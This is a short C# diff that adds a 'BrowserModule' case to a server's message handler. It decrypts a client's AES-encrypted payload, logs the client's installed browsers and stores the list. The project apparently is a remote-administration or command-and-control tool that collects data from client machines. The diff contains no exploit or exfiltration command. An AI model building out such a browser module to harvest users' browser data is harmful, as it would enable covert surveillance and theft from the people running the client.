@@ -401,6 +401,22 @@ namespace Server.Conexion
                                 }
                                 break;
 
+                            case Channel.BrowserModule:
+
+                                if (_aesKeys.TryGetValue(clientId, out var browserKey))
+                                {
+                                    string installedBrowsers = Encoding.UTF8.GetString(AesHelper.DecryptWithAes(payload, browserKey));
+                                    _logger.Log($"Browsers: {installedBrowsers}.", LogLevel.INFO);
+
+                                    BrowserModule.Instance.AppendBrowsers(installedBrowsers);
+                                    
+                                }
+                                else
+                                {
+                                    _logger.Log($"No se encontró clave AES para el cliente {clientId}.", LogLevel.ERROR);
+                                }
+                                break;
+
                         }
                     }
                 }
